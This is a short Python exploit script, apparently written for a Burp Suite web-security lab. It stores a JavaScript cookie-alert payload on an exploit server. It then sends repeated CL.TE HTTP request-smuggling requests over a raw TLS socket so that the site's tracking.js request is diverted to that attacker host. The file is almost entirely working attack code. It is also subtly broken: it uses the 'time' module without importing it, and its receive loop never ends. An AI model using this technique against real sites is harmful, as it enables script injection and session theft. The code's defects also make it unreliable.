import socket, ssl
import sys
import requests
import re

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
host = burp_url[8:]
print(host)
session = requests.Session()

response = session.get(burp_url)
exploit_server = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text).group(0)
exploit_host = exploit_server[8:]
print(exploit_host)

burp_data = {"urlIsHttps": "on", "responseFile": "/post", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/javascript; charset=utf-8", "responseBody": "alert(document.cookie)\r\n", "formAction": "STORE"}
session.post(exploit_server, data=burp_data)


context = ssl.create_default_context()
sock = socket.create_connection((host, 443))
conn = context.wrap_socket(sock, server_hostname=host)

for _ in range(100):
    request = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-length: 310\r\n"
        "Transfer-Encoding: chunked\r\n\r\n"
        "0\r\n\r\n"
        "GET /post/next?postId=3 HTTP/1.1\r\n"
        f"Host: {exploit_host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 10\r\n\r\n"
        "x=1\r\n\r\n"
        "GET /resources/js/tracking.js HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Connection: close"
    )

    conn.send(request.encode())
    response = b""
    while True:
        data = conn.recv(4096)
        response += data
    print(response.decode())
    requests.get(burp_url)
    time.sleep(0.1)

conn.close()
